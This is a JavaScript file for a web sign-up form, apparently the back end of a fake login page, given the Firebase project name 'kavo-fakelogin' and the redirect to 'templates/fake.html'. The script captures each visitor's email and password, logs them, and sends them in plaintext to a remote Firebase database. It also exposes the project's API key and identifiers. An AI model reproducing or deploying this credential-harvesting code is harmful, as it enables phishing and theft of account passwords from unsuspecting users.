// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyCz9YRhC0EX4nb1eLDMBwfyV06Aa2jcqEw",
    authDomain: "kavo-fakelogin.firebaseapp.com",
    projectId: "kavo-fakelogin",
    storageBucket: "kavo-fakelogin.appspot.com",
    messagingSenderId: "486953232376",
    appId: "1:486953232376:web:be95b9f243fd74b60bd80d",
    measurementId: "G-SDWCYCKNKG",
    databaseURL: "https://kavo-fakelogin-default-rtdb.firebaseio.com" // Make sure this URL is correct
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Get a reference to the database service
const database = firebase.database();

// Get elements
const signupForm = document.getElementById('signupForm');
const messageElement = document.getElementById('message');

// Add signup event
signupForm.addEventListener('submit', e => {
    e.preventDefault();
    console.log('Form submitted');

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    console.log('Email:', email);
    console.log('Password:', password);

    // Create a new user entry in the database
    const newUserRef = database.ref('users').push();
    newUserRef.set({
        email: email,
        password: password  // Remember, storing passwords like this is not secure!
    })
    .then(() => {
        console.log('User data saved successfully');
        messageElement.textContent = `Successfully signed up! User ID: ${newUserRef.key}`;
        window.location.assign("templates/fake.html");
    })
    .catch((error) => {
        console.error('Error saving user data:', error);
        messageElement.textContent = `Error signing up: ${error.message}`;
    });
});